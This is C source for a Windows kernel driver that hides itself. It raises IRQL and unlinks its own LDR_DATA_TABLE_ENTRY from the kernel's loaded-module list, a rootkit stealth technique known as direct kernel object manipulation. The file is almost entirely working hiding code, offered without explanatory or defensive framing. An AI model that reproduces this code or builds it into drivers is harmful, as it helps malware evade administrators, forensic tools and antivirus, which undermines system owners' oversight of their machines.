#include <ntddk.h> 
#include <windef.h>

#pragma warning(push)
#pragma warning(disable: 4201)
typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	struct _ACTIVATION_CONTEXT * EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
#pragma warning(pop)

VOID OnDriverUnload(IN PDRIVER_OBJECT pDriverObject)
{
	UNREFERENCED_PARAMETER(pDriverObject);

	DbgPrint("Driver unload routine triggered!\n");
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pRegistryPath)
{
	UNREFERENCED_PARAMETER(pRegistryPath);

	if (!pDriverObject)
		return STATUS_FAILED_DRIVER_ENTRY;

	DbgPrint("Driver loaded!\n"); 

	KIRQL irql = KeRaiseIrqlToDpcLevel();

	PLDR_DATA_TABLE_ENTRY CurDriverEntry = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	PLDR_DATA_TABLE_ENTRY NextDriverEntry = (PLDR_DATA_TABLE_ENTRY)CurDriverEntry->InLoadOrderLinks.Flink;
	PLDR_DATA_TABLE_ENTRY PrevDriverEntry = (PLDR_DATA_TABLE_ENTRY)CurDriverEntry->InLoadOrderLinks.Blink;

	PrevDriverEntry->InLoadOrderLinks.Flink = CurDriverEntry->InLoadOrderLinks.Flink;
	NextDriverEntry->InLoadOrderLinks.Blink = CurDriverEntry->InLoadOrderLinks.Blink;

	CurDriverEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)CurDriverEntry;
	CurDriverEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)CurDriverEntry;

	KeLowerIrql(irql);

	DbgPrint("Driver hiding completed!\n");

	pDriverObject->DriverUnload = &OnDriverUnload;
	return STATUS_SUCCESS;
}


